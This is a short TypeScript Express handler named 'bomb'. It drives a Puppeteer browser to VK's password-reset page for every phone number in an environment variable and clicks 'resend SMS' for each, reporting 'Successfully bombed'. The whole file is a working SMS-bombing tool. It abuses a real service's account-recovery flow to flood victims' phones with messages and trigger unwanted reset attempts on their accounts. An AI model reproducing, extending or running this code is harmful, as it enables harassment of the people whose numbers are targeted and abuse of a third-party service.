import { Request, Response } from "express";
import wait from "../utils/wait";
import range from "../utils/range";
import clickResendSmsBtn from "../actions/clickResendSmsBtn";
import inputPhoneNumber from "../actions/inputPhoneNumber";
import pressEnter from "../actions/pressEnter";
import confirmFirstTime from "../actions/confirmFirstTime";
import confirmSecondTimeIfNeeded from "../actions/confirmSecondTimeIfNeeded";
import getBrowser from "../utils/getBrowser";
import { Browser } from "puppeteer-core";


export default async function bomb(req: Request, res: Response) {
  const phoneNumbers = getPhoneNumbersAsArray();
  console.log(`Phone numbers: ${phoneNumbers}`);

  const browser = await getBrowser({ headless: false });
  console.log("Browser launched...");
  console.log(browser);
  
  const promises = phoneNumbers.map(async phoneNumber => {
    return interactWithBrowser(browser, phoneNumber);
  });
  await Promise.all(promises);
  await browser.close();
  
  res.status(200).send("Successfully bombed");
}

function getPhoneNumbersAsArray() {
  const phoneNumbersStr = process.env.PHONE_NUMBERS;
  if (!phoneNumbersStr) throw new Error("no phone numbers are provided");
  
  return phoneNumbersStr.split(" ");
}

async function interactWithBrowser(browser: Browser, phoneNumber: string) {
  const page = await browser.newPage();
  
  await page.goto("https://id.vk.com/restore/#/resetPassword");
  await wait(3000);
  
  await inputPhoneNumber(page, phoneNumber);
  await pressEnter(page);
  
  await confirmFirstTime(page);
  await confirmSecondTimeIfNeeded(page);
  
  await clickResendSmsBtn(page);
  
  await wait(range(2000, 4000));
}
